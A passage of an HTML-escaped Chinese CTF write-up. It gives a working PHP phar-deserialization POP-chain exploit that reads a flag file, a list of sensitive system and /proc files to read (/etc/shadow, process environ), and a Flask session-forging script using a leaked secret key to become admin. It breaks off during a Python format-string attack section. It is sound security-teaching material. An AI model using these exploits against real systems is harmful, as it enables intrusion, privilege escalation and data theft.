&lt;p&gt;那么利用点有了，下面就需要构造利用链，也就是pop链的构造，所以先去看看定义了哪些类，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; C1e4r
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$test&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __construct(&lt;span&gt;$name&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;str = &lt;span&gt;$name&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __destruct()
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;test = &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;str;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;test;
    }
}

&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Show
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$source&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __construct(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;source = &lt;span&gt;$file&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __toString()
    {
        &lt;/span&gt;&lt;span&gt;$content&lt;/span&gt; = &lt;span&gt;$this&lt;/span&gt;-&amp;gt;str['str']-&amp;gt;&lt;span&gt;source;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$content&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __set(&lt;span&gt;$key&lt;/span&gt;,&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;$key&lt;/span&gt; = &lt;span&gt;$value&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; _show()
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;('/http|https|file:|gopher|dict|\.\.|f1ag/i',&lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source)) {
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('hacker!'&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;highlight_file&lt;/span&gt;(&lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source);
        }

    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __wakeup()
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source)) {
            &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;hacker~&quot;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;source = &quot;index.php&quot;&lt;span&gt;;
        }
    }
}



&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$file&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$params&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __construct()
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;params = &lt;span&gt;array&lt;/span&gt;&lt;span&gt;();
    }&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __get(&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;get(&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; get(&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$this&lt;/span&gt;-&amp;gt;params[&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;])) {
            &lt;/span&gt;&lt;span&gt;$value&lt;/span&gt; = &lt;span&gt;$this&lt;/span&gt;-&amp;gt;params[&lt;span&gt;$key&lt;/span&gt;];
        } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;$value&lt;/span&gt; = &quot;index.php&quot;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;file_get(&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; file_get(&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;)
    {   &lt;/span&gt;
        &lt;span&gt;$text&lt;/span&gt; = &lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;file_get_contents&lt;/span&gt;(&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$text&lt;/span&gt;&lt;span&gt;;
    }
}
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;一共有三个类，因为要反序列化，所以要找到对对象进行反序列时会执行的函数，我们知道：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;析构函数__destruct()：当对象被销毁时会自动调用。
__wakeup() ：如前所提，&lt;/span&gt;&lt;span&gt;unserialize&lt;/span&gt;()时会自动调用。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;但是在可以利用的类中有show类中有__wakeup()，但是这只是一个过滤函数，其中只执行了赋值操作，没有利用的价值。剩下的就是在C1e4r这个类中存在__destruct()函数，所以我们的pop链的入口就是C1e4r这个类了，但是这个类中：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; C1e4r
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$test&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __construct(&lt;span&gt;$name&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;str = &lt;span&gt;$name&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __destruct()
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;test = &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;str;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;test;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在执行反序列化以后只会输出$this-&amp;gt;test，还给了另外两个类，肯定要关联到另外两个类，在show类中，存在__toString方法，所以只要令$this-&amp;gt;test=show这个类的对象，就可以因为echo了show的对象而进一步调用&lt;/p&gt;
&lt;p&gt;__toString()方法，因为我们最终需要访问到flag.php文件，所以必须有个读文件的函数，这里在test类中定义了file_get_contens()函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Show
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$source&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __construct(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;source = &lt;span&gt;$file&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __toString()
    {
        &lt;/span&gt;&lt;span&gt;$content&lt;/span&gt; = &lt;span&gt;$this&lt;/span&gt;-&amp;gt;str['str']-&amp;gt;&lt;span&gt;source;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$content&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __set(&lt;span&gt;$key&lt;/span&gt;,&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;$key&lt;/span&gt; = &lt;span&gt;$value&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; _show()
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;('/http|https|file:|gopher|dict|\.\.|f1ag/i',&lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source)) {
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('hacker!'&lt;span&gt;);
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;highlight_file&lt;/span&gt;(&lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source);
        }

    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __wakeup()
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, &lt;span&gt;$this&lt;/span&gt;-&amp;gt;&lt;span&gt;source)) {
            &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;hacker~&quot;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;source = &quot;index.php&quot;&lt;span&gt;;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$file&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$params&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt;&lt;span&gt; __construct()
    {
        &lt;/span&gt;&lt;span&gt;$this&lt;/span&gt;-&amp;gt;params = &lt;span&gt;array&lt;/span&gt;&lt;span&gt;();
    }&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; __get(&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;get(&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; get(&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$this&lt;/span&gt;-&amp;gt;params[&lt;span&gt;$key&lt;/span&gt;&lt;span&gt;])) {
            &lt;/span&gt;&lt;span&gt;$value&lt;/span&gt; = &lt;span&gt;$this&lt;/span&gt;-&amp;gt;params[&lt;span&gt;$key&lt;/span&gt;];
        } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;$value&lt;/span&gt; = &quot;index.php&quot;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$this&lt;/span&gt;-&amp;gt;file_get(&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; file_get(&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;)
    {   &lt;/span&gt;
        &lt;span&gt;$text&lt;/span&gt; = &lt;span&gt;base64_encode&lt;/span&gt;(&lt;span&gt;file_get_contents&lt;/span&gt;(&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;$text&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;只要让$value为flag.php即可，那么向上走，$value = $this-&amp;gt;params[$key]，而这个$params是test的属性，key是get的参数，又是__get的参数，而__get这个函数是当访问类的不存在的属性或者私有属性时自动调用的魔术方法，因此得构造一个test的对象，并且让这个对象访问一个test类中不存在的方法，此时只有看show这个类了，因为在__toString中存在$content = $this-&amp;gt;str['str']-&amp;gt;source;所以我们可以，我们可以让str['str']为test类的对象，从而调用source来调用test类的__get方法，并且令test这个类对象的params的键为source，键的值为flag对应的绝对路径。&lt;/p&gt;
&lt;p&gt;exp如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; C1e4r
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$test&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Show
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$source&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$str&lt;/span&gt;&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$file&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;$params&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;('source' =&amp;gt; '/var/www/html/f1ag.php'&lt;span&gt;);
}

    &lt;/span&gt;&lt;span&gt;$phar&lt;/span&gt; = &lt;span&gt;new&lt;/span&gt; Phar(&quot;tr1ple.phar&quot;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span&gt;startBuffering();
    &lt;/span&gt;&lt;span&gt;$p1&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; C1e4r();
    &lt;/span&gt;&lt;span&gt;$p2&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Show();
    &lt;/span&gt;&lt;span&gt;$p1&lt;/span&gt;-&amp;gt;str=&lt;span&gt;$p2&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$p2&lt;/span&gt;-&amp;gt;str['str']=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Test();
    &lt;/span&gt;&lt;span&gt;$phar&lt;/span&gt;-&amp;gt;addFromString(&quot;tr1ple.txt&quot;, &quot;success&quot;&lt;span&gt;); 
    &lt;/span&gt;&lt;span&gt;$phar&lt;/span&gt;-&amp;gt;setMetadata(&lt;span&gt;$p1&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;$phar&lt;/span&gt;-&amp;gt;stopBuffering();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;pop链的构造就是通过类之间方法和属性的联系将他们环环相扣，要找好每个类之间的连接点。在反序列化后，原本的对象所带的属性将全部恢复，并且可以正常的调用原有类中的方法。&lt;/p&gt;
&lt;p&gt; 3.皇家线上赌场&lt;/p&gt;
&lt;p&gt;我觉得这道题目还是在考察对python的熟悉程度，以及对linux系统的熟悉程度，有些比赛的题目中通过将一些敏感信息暴露在系统的配置文件中来让我们找，可能在真实的实战环境中也可以通过系统或应用的配置信息来得到一些可以利用的点。&lt;/p&gt;
&lt;p&gt;系统通用的配置文件有：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
/etc/&lt;span&gt;passwd
&lt;/span&gt;/etc/&lt;span&gt;my.cnf
&lt;/span&gt;/etc/&lt;span&gt;shadow
&lt;/span&gt;/etc/sysconfig/network-scripts/ifcfg-&lt;span&gt;eth0   ip地址
&lt;/span&gt;/etc/hosts                                  通常配置了一些内网域名
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;文件读取的情况下文件读取的情况下当然可以可以读取proc目录下的文件来获得更多系统的信息。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
/proc/&lt;span&gt;sched_debug  提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
&lt;/span&gt;/proc/&lt;span&gt;mounts 挂载的文件系统列表
&lt;/span&gt;/proc/net/&lt;span&gt;arp  arp表，可以获得内网其他机器的地址
&lt;/span&gt;/proc/net/&lt;span&gt;route 路由表信息
&lt;/span&gt;/proc/net/tcp and /proc/net/&lt;span&gt;udp  活动连接的信息
&lt;/span&gt;/proc/net/&lt;span&gt;fib_trie 路由缓存
&lt;/span&gt;/proc/&lt;span&gt;version  内核版本
&lt;/span&gt;/proc/[PID]/&lt;span&gt;cmdline 可能包含有用的路径信息
&lt;/span&gt;/proc/[PID]/&lt;span&gt;environ 程序运行的环境变量信息，可以用来包含getshell
&lt;/span&gt;/proc/[PID]/&lt;span&gt;cwd     当前进程的工作目录
&lt;/span&gt;/proc/[PID]/fd/[#]  访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;而在这道题目中明显存在文件读取的漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223203255650-1022358122.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;并且在题目中已经有给出的路径树以及tips：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt; filename != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/home/ctf/web/app/static/test.js&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; and filename.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/home/ctf/web/app&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) != -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; abort(&lt;span&gt;404&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;从tips中可以看到，如果我们访问的路径中存在/home/ctf/web/app的话就会返回404。&lt;/p&gt;
&lt;p&gt;因此我们以此绝对路径去bypass访问web目录中的文件，这里又要用道python的一个trick，&lt;code&gt;os.path.join&lt;/code&gt; 函数的一个特性：参数中的绝对路径参数前面的所有参数会被忽略&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223205300801-1599843632.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;所以此时就需要利用/proc目录下的文件&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;当访问/proc/self/environ时，会返回如下所示:&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223204951663-1322057346.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当访问/etc/passwd的时候，会返回如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223205638721-963183261.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p align=&quot;left&quot;&gt; 而通过&lt;code&gt;/proc/self/maps&lt;/code&gt; 可以看到web路径，但是并不能通过此web路径来直接访问文件，后面出题人说是禁止了直接访问，此时就要用到上面说的其中一条：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
/proc/[pid]/cwd是进程当前工作目录的符号链接
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因为前面已经出现过os.path.join('app/static', filename)，所以当前路径就是源码所在的路径，所以/proc/self/cwd/app/views.py，就能够读到文件，把能读的都读一遍，能读到源码的话，flask的题目肯定拿到secret key就可以伪造session了。&lt;/p&gt;
&lt;p&gt;这里伪造session也是有点坑，因为题目的环境是python3.5写的，所以用python2伪造的session无法通过，需要用python3的环境才行，不要一味的相信工具。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223213148717-1408820159.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201812/1063309-20181223213159234-1910889764.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 下面是出题人给的exp:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; flask.sessions &lt;span&gt;import&lt;/span&gt;&lt;span&gt; SecureCookieSessionInterface                                                                        
                                                                                                                               
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; App(object):                                                                                                             
    secret_key &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;9f516783b42730b7888008dd5c15fe66&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;                                                                            
                                                                                                                               
s &lt;/span&gt;=&lt;span&gt; SecureCookieSessionInterface().get_signing_serializer(App())                                                               
u &lt;/span&gt;= s.loads(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;eyJjc3JmX3Rva2VuIjoiMzgyMWRlNmFlMTRmNjc2NjU0YWNhMjZjYTQ1MzY4Y2Y3NjI2MzI1NSJ9.XBpHyw.9S0EAg9_yQKg7D3xqPp08eMIeH8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) 
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(u)                                                                                                                       
u[&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;username&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;] = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;admin&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;                                                                                                        
&lt;span&gt;print&lt;/span&gt;(s.dumps(u))                                                                                                              
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用python3运行以后，出来的sesion就可以通过服务器端的校验，这里只需要伪造username这一个字段就可以了，其他的服务端不作为身份校验，到此以admin登陆以后第一步就完成了，接下来是第二步：&lt;/p&gt;
&lt;h3 id=&quot;toc-13&quot;&gt;格式化字符串攻击：&lt;/h3&gt;
&lt;p&gt;前置知识：&lt;/p&gt;
&lt;p&gt;从python2.6开始，就有了用format来格式化字符串的新特性，它可以通过{}来确定出字符串格式的位置和关键字参数，并且随时可以显式对数据项重新排序。此外，它甚至可以&lt;span&gt;访问对象的属性和数据项&lt;/span&gt;——这是导致这里的安全问题的根本原因。&lt;/p&gt;
&lt;p&gt;这里贴两个大佬的记录链接：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
1.https://github.com/bit4woo/code2sec.com/blob/master/Python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%&lt;span&gt;B5.md
2.https:&lt;/span&gt;//www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;看了大佬写的文章以后，我觉得这个漏洞主要还是攻击者能够控制format的结果，从而通过当前环境可以访问到的对象，比如user，order(必须是使用到的)等等，比如Django中&lt;code&gt;request.user&lt;/code&gt;是当前用户对象，这个对象包含一个属性&lt;code&gt;password&lt;/code&gt;，也就是该用户的密码。通过这些对象来构造一条属性链到达一些全局的配置信息对象比如settings或其他敏感配置项，进而越权访问一些环境中的配置信息和敏感信息，回到题目中：&lt;/p&gt;
&lt;p&gt;__init__.py的代码如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; .app &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Flask, Request, Response
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; .config &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Config
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; .helpers &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url_for, flash, send_file, send_from_directory, 
     get_flashed_messages, get_template_attribute, make_response, safe_join, 
     stream_with_context
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; .globals &lt;span&gt;import&lt;/span&gt;&lt;span&gt; current_app, g, request, session, _request_ctx_stack, 
     _app_ctx_stack&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到current_app和g在同一个命名空间下,我们这里需要学习下g是啥：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;## 保存全局变量的g属性：&lt;/span&gt;
&lt;span&gt;
g：&lt;/span&gt;&lt;span&gt;global&lt;/span&gt;

1&lt;span&gt;. g对象是专门用来保存用户的数据的。

&lt;/span&gt;2. g对象在一次请求中的所有的代码的地方，都是可以使用的。
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;getflag的路由如下，在我们登陆后&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
@app.route(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/getflag&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, methods=(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;POST&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,))
@login_required
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; getflag():
    u &lt;/span&gt;= getattr(g, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;u&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
